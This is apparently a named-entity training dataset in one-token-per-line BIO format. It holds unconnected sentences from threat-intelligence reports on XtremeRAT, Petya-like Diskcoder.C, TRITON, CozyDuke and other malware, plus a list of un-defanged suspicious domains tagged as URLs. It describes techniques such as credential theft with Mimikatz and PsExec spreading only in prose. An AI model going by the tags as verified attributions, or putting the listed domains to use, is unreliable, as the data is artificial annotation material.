. O

cleaned.exe O

Decoy O
content O
presented O
in O
malicious O
archive O
Figure O
4 O
shows O
the O
controller O
the O
attacker O
uses O
to O
interact O
with O
systems O
compromised O
with O
XtremeRAT B-malware.backdoor
. O

As O
no O
concrete O
attribution O
has O
yet O
been O
made O
, O
due O
to O
the O
shared O
interests O
and O
malware O
features O
of O
both O
2017 O
and O
2018 O
campaigns O
, O
the O
Gaza O
Cybergang O
may O
be O
a O
good O
starting O
point O
for O
further O
research O
. O

Visually O
this O
MBR O
part O
of O
Diskcoder.C O
looks O
like O
a O
slightly O
modified O
version O
of O
Petya B-malware.ransom
: O
at O
first O
it O
displays O
a O
message O
that O
impersonates O
CHKDSK O
, O
Microsoft O
's O
disk O
checking O
utility O
. O

The O
article O
is O
brief O
, O
but O
states O
that O
' O
This O
is O
– O
by O
far O
– O
the O
most O
serious O
information O
security O
incident O
we O
have O
seen O
in O
Poland O
' O
followed O
by O
a O
claim O
that O
over O
20 O
commercial O
banks O
had O
been O
confirmed O
as O
victims O
. O

chat-world.site B-url.unknown
chat-messenger.site B-url.unknown
gserv.mobi B-url.unknown
arab-chat.site B-url.unknown
onlineclub.info B-url.unknown
free-apps.us B-url.unknown
network-lab.info B-url.unknown
kikstore.net B-url.unknown

It O
creates O
a O
mutex O
' O
HFRM_ O
' O
to O
ensure O
there O
is O
only O
one O
running O
copy O
of O
the O
backdoor O
. O

Staff O
Training O
: O
Have O
we O
trained O
staff O
on O
cybersecurity O
best O
practices O
? O

If O
the O
type O
of O
the O
object O
that O
the O
system O
is O
trying O
to O
validate O
is O
a O
process O
, O
the O
hook O
code O
rewrites O
again O
the O
configuration O
data O
of O
the O
ZxShell B-malware.backdoor
service O
in O
the O
windows O
registry O
. O

The O
hosting O
company O
is O
not O
a O
known O
bulletproof O
hoster O
based O
on O
the O
BGP O
Ranking O
information.and O
was O
announced O
by O
two O
other O
ISPs O
before O
: O

Similar O
to O
a O
younger O
sibling O
looking O
up O
to O
a O
big O
brother O
, O
regional O
and O
middle O
powers O
within O
South O
Asia O
are O
seeking O
to O
leverage O
global O
cyber O
espionage O
in O
an O
effort O
to O
achieve O
parity O
with O
nation O
states O
who O
have O
far-reaching O
diplomatic O
power O
, O
modernized O
militaries O
and O
influential O
economies O
. O

It O
did O
not O
leverage O
the O
underlying O
TRITON B-malware.infosteal
library O
's O
capability O
for O
Triconex B-malware.unknown
device O
discovery O
, O
instead O
an O
instance O
of O
trilog.exe O
had O
to O
be O
invoked O
separately O
for O
each O
target O
controller O
in O
the O
environment O
. O

In O
the O
end O
, O
it O
releases O
code O
to O
execute O
after O
constructing O
an O
object O
. O

Giấy O
yêu O
cầu O
bồi O
thường O
mới O
2016 O
- O
Hằng.doc O

© O
2018 O
Accenture O
. O

We O
have O
strong O
evidence O
suggesting O
the O
group O
using O
CozyDuke B-malware.drop
is O
the O
same O
as O
- O
or O
at O
the O
least O
shares O
command O
and O
control O
infrastructure O
with O
- O
the O
group O
or O
groups O
using O
MiniDuke O
and O
OnionDuke O
. O

This O
should O
raise O
red O
flags O
for O
users O
, O
however O
, O
sometimes O
temptation O
trumps O
security O
. O

~/Library/LaunchAgents/ O
folder O
. O

Specifically O
, O
we O
identified O
a O
malicious O
PHP O
backdoor O
that O
was O
deployed O
under O
medoc_online.php O
in O
one O
of O
the O
FTP O
directories O
on O
M.E.Doc O
's O
server O
. O

System O
fingerprint O

Compilation O
Date O

Policies O
to O
avoid O
include O
lack O
of O
password O
expiration O
date O
, O
lack O
of O
lockout O
policy O
, O
low O
or O
disabled O
password O
complexity O
requirements O
, O
and O
password O
history O
set O
to O
zero O
. O

Detailed O
analysis O
of O
Jokra B-malware.unknown
can O
be O
found O
here O
. O

Diskcoder.C O
also O
adopted O
the O
method O
from O
the O
Win32/Filecoder.AESNI.C O
( O
aka O
XData O
) O
ransomware O
: O
it O
uses O
a O
lightweight O
version O
of O
Mimikatz O
to O
obtain O
credentials O
and O
then O
executes O
the O
malware O
using O
SysInternals O
' O
PsExec O
on O
other O
machines O
on O
the O
LAN O
. O

Deep O
Cluster O
( O
aka O
Cluster O
2 O
, O
centred O
on O
news.foundationssl[.]com B-url.unknown
) O

5 O
Oct O
. O

> O
> O
16 O
) O
+ O
( O
& O
0xffff O
) O
* O
2 O

Commands O
that O
are O
possibly O
executed O
are O
listed O
in O
Table O
1 O
. O

winrm.exe B-malware.infosteal
, O
stisvc.exe B-malware.infosteal
: O

Talos O
has O
worked O
closely O
with O
Apple O
on O
countering O
this O
threat O
. O

Upon O
connection O
to O
the O
C2 O
, O
the O
malware O
sends O
a O
lot O
of O
information O
about O
the O
target O
including O
: O
Country O
, O
Malware O
Path O
, O
Local O
IP O
Address O
, O
RAM O
, O
Android O
Version O
, O
Device O
Name O
, O
... O
, O
etc O
. O

User O
interaction O
is O
required O
in O
order O
to O
execute O
something O
malicious O
in O
this O
way O
. O

This O
command O
line O
invokes O
remote O
Metasploit O
stager O
( O
android.apk O
) O
and O
drops O
cpuminer O
2.3.2 O
( O
minerd.txt O
) O
built O
for O
ARM O
processor O
. O